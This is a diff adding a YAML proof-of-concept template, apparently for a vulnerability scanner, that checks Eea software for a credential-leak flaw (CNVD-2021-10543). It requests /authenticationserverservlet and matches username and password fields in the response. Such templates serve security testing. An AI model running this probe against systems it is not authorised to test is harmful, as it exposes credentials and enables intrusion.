@@ -1,0 +1,23 @@
+id: poc-yaml-eea-info-leak-cnvd-2021-10543
+info:
+  name: Eea 信息泄露漏洞(CNVD-2021-10543)
+  severity: high
+  tags:
+  - cnvd-2021-10543
+  - CNVD-2021-10543
+  finger: Eea
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /authenticationserverservlet
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "<username>(.*?)</username>") &&
+    matches(body, "<password>(.*?)</password>")
+  output: []
